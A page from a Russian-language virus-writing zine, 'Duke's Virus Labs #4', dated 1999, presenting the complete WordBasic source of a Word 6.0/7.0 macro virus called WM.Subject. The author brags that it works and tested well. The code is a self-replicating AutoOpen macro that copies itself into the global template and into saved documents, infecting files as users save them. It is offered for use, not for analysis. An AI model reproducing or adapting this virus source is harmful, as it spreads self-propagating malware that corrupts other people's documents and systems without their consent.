- [Duke's Virus Labs #4] - [Page 12] -

WM.Subject
(c) by Duke/SMF

Имя вируса    : WM.Subject
Автор         : Duke/SMF
Язык прогр.   : WordBasic
Дата создания : 24.01.99

   Еще один макро-вирус для Word 6.0/7.0 - очень маленький и совсем без
спецэффектов. Но зато работающий ! Поражает открытые файлы при сохранении.
На тестированиях показал себя молодцом :)
   Состоит из единственного макроса AutoOpen (зато копируется в AutoNew) :

===== Cut here =====
Sub MAIN
On Error Goto ErrorHandler

Fname$ = FileName$()
MacName$ = Fname$ + ":AutoOpen"

FileSummaryInfo .Subject = "Macro.Word.Subject"
FileSummaryInfo .Author = "Duke/SMF"

MacroCopy MacName$, "Global:AutoNew", - 1
MacroCopy MacName$, "Global:AutoOpen", - 1

ErrorHandler:

If IsDocumentDirty() = - 1 Then
  MacroCopy "Global:AutoOpen", MacName$, - 1
End If
FileSaveAs .Format = 1

End Sub
===== Cut here =====
